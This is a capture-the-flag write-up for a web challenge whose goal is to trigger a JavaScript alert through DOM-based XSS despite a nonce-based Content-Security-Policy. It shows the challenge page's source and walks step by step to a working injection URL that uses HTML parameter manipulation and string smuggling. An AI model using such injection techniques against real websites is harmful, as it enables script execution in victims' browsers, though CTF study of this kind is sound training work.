---
title: "<script>alert()</script>"
layout: page
---

- CSP 
- DOM 
- XSS 
- JavaScript 
- Web Security
- Hard

Writeup by `kecskemekeg`

# Mission brief
Can you make sense of the complexity and inject some malicious JavaScript into this website?

## Instructions
Your goal is to craft a URL that triggers an alert box when opened in Google Chrome (without any user interaction). The URL will be the flag.

## Glossary
### CSP
By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.
https://cheatsheetseries.owasp.org/

### DOM XSS
DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM "environment" in the victim's browser used by the original client-side script, so that the client-side code runs in an "unexpected" manner. That is, the page itself (the HTTP response that is) does not change, but the client-side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
https://cheatsheetseries.owasp.org/

---

# Writeup
**This challenge happens on a website**

```html
<html>
  <head>
    <title></title>
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-0290f74d68574e4bb4ac5b7d396ec216'; style-src 'nonce-0290f74d68574e4bb4ac5b7d396ec216'"
    />

    <style nonce="0290f74d68574e4bb4ac5b7d396ec216">
      body {
        background: #23a6d5;
        background-size: 400% 400%;
      }
      
      .cheat {
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: "Comic Sans MS", cursive, sans-serif;
        font-weight: bold;
      }
      .attribute-breaker {
        display: none;
      }
    </style>
  </head>
  <body id="doc-body">
    <script nonce="0290f74d68574e4bb4ac5b7d396ec216">
      window.addEventListener("DOMContentLoaded", function () {
        let yw = `)]}'` + new URL(location.href).searchParams.get("xss");
        let ce = document.getElementById("doc-body").lastElementChild;
        if (ce.id == "hesoyam") {
          let oe = ce.lastElementChild;
          let ct = oe.innerHTML.trim();
          let lfc = ct.substr(ct.length - 4);
          yw = lfc + yw;
        }
        let s = document.createElement("script");
        s.type = "text/javascript";
        s.appendChild(document.createTextNode(yw));
        document.body.appendChild(s);
      });
    </script>
    <!-- !!! -->
    <div id="html"><!-- ?html=YOUR_INPUT --></div>
    <!-- !!! -->
    <div class="attribute-breaker">'"</div>
    <div class="cheat">
      <code> Do you need some extra help? It should be useful: //// </code>
    </div>
  </body>
</html>
```

First I opened the source code and the Inspector to see the html code. It was obvious that we need a `<div>` with id="hesoyam" as the last element so I closed the previous one and opened a new one with the code
`/?html=</div><div%20id=hesoyam>`
I saw that this way it won't be the last element so I added another `<div>` to eat the closing `</div>`
`/?html=</div><div%20id=hesoyam><div>`
From the source code you can see that the script will consists of the last four characters of the `innerhtml` of the last element of `<div id=hesoyam> + )]}'` + your XSS code
I needed a way to manipulate the last four characters so I tried what would happen if I made syntax error on purpose.
`/?html=</div><div%20id=hesoyam><div><x`
This behaviour was very unexpected but perfect for me. Next my idea was to put the unnecessary characters in a string.
This is the first half of the string
`/?html=</div><div%20id=hesoyam><div><x"%27`
Then I only needed the xss code with the last part of the string.
`/?html=</div><div%20id=hesoyam><div><x"%27&xss=";alert()`
And this was the solution.

(note: injecting any script tag would never work because this site had content-security-policy enabled /Sasszem/)